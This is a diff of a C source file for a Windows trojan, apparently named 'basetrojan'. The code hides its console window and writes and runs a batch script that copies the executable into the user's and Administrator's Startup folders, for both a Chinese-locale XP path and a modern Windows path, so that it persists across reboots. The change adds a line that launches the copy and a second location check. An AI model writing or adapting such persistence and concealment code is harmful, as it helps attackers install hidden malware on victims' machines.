@@ -5,14 +5,14 @@
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
 #define BUFFER_SIZE 4096
-char bat[]="@echo off \ncopy /y \"%~dp0basetrojan.exe\"  C:\\\"Documents and Settings\"\\Administrator\\\"「开始」菜单\"\\程序\\启动\ncopy /y \"%~dp0basetrojan.exe\"  C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup \n";
+char bat[]="@echo off \ncopy /y \"%~dp0basetrojan.exe\"  C:\\\"Documents and Settings\"\\Administrator\\\"「开始」菜单\"\\程序\\启动\ncopy /y \"%~dp0basetrojan.exe\"  C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup \nstart basetrojan.exe";
 int main(int argc,char* argv[]) {
-	system("b.bat");
+	//system("b.bat");
 	ShowWindow(FindWindow((LPCWSTR)"ConsoleWindowClass",(LPCWSTR)argv[0]), 0);
 	char buf1[256];
 	_getcwd(buf1, sizeof(buf1));
 	printf("%s\n",buf1);
-	if(strcmp(buf1,"C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")!=0){
+	if(strcmp(buf1,"C:\\Users\\alpha\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")!=0&&strcmp(buf1,"C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动")!=0){
 		FILE* fp=fopen("b.bat","w");
 		fputs(bat,fp);
 		system(bat);
